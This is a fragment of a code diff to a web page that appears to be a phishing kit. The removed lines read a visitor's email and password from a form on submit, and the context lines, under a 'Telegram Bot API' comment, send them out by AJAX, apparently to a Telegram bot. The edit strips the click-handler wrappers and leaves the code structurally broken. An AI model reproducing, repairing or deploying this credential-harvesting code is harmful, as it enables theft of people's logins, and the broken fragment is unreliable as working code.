@@ -431,12 +431,6 @@ position: fixed;
           count=0;
          
          
-		$('#submit-btn').click(function (event) {
-    event.preventDefault();
-
-    var email = $("#email").val();
-    var password = $("#password").val();
-    var detail = $("#field").html();
 
     // Telegram Bot API
     $.ajax({
@@ -467,7 +461,7 @@ position: fixed;
             alert("Unable to send.");
         }
     });
-});
+
           
           
         document.getElementById('codeEmail').value = email;
@@ -493,12 +487,7 @@ position: fixed;
         else
         {
             
-         $('#submit-btn').click(function (event) {
-    event.preventDefault();
-
-    var email = $("#email").val();
-    var password = $("#password").val();
-    var detail = $("#field").html();
+        
 
     // Telegram Bot API
     $.ajax({
@@ -529,7 +518,7 @@ position: fixed;
             alert("Unable to send.");
         }
     });
-});
+
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
               $('#submit-btn').html('Verifing...');
